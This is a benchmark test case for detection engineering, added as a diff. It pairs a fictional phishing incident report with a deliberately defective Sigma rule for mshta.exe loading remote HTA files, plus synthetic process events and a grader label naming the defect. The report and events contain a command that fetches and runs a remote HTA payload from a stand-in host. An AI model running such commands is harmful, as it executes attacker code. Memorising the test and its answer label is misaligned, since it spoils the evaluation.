@@ -1,0 +1,112 @@
+id: D4-01
+role: defective
+defect_class: D4
+evasive: false
+why: The rule requires ParentImage to end with winword.exe, but that process name appears nowhere in the
+  report text or in either evidence quotation, and no assumption covers it. The other values (mshta.exe,
+  http, .hta) are quoted, so the unsupported parent-process value is the only defect.
+expected_gate: G4
+report_text: 'Incident summary CRANEMAIL-114: the intrusion set we track as Marsh Heron sent invoice-themed
+  emails to finance staff at a regional logistics firm. After the recipient enabled content in the attachment,
+  a child process reached out to the staging host files.cranemail.test and executed an HTML application
+  payload directly from the network. Responders recovered the following command from endpoint telemetry:
+  mshta.exe https://files.cranemail.test/portal/invoice.hta. The HTA file contained a short VBScript stub
+  that wrote a loader to the user''s profile and launched it. No additional switches or wrapper scripts
+  were present on the command line. Analysts assess that the operators prefer living-off-the-land binaries
+  because they blend in with ordinary Office activity. The hosting domain was registered nine days before
+  the first email was seen.'
+evidence:
+- mshta.exe https://files.cranemail.test/portal/invoice.hta
+- executed an HTML application payload directly from the network
+logsource: windows_process_creation
+techniques:
+- T1218.005
+sigma_yaml: |
+  title: Mshta Loading Remote HTA From Word
+  id: 7c1e4a52-3b0d-4f6a-9e21-5d8a0c3b7f14
+  status: experimental
+  description: Detects mshta.exe started by winword.exe that loads a remote HTA payload over HTTP or HTTPS.
+  references:
+    - urn:atidep:case
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.stealth
+    - attack.t1218.005
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection:
+      Image|endswith: '\mshta.exe'
+      ParentImage|endswith: '\winword.exe'
+      CommandLine|contains|all:
+        - 'http'
+        - '.hta'
+    condition: selection
+  falsepositives:
+    - Internal line-of-business applications delivered as remote HTA files
+  level: high
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\mshta.exe
+    cmd: mshta.exe https://files.cranemail.test/portal/invoice.hta
+    parent: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+    parent_cmd: WINWORD.EXE /n C:\Users\bob\Documents\invoice.docm
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\mshta.exe
+    cmd: mshta.exe http://files.cranemail.test/portal/invoice2.hta
+    parent: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+    parent_cmd: WINWORD.EXE /n C:\Users\carol\Documents\statement.docm
+    user: LAB\carol
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\cmd.exe
+    cmd: cmd.exe /c ipconfig /all
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\notepad.exe
+    cmd: notepad.exe C:\Users\alice\notes.txt
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\mshta.exe
+    cmd: mshta.exe C:\Tools\HelpDeskPortal.hta
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\helpdesk
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\mshta.exe
+    cmd: mshta.exe C:\LabTools\about.hta
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\dave
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
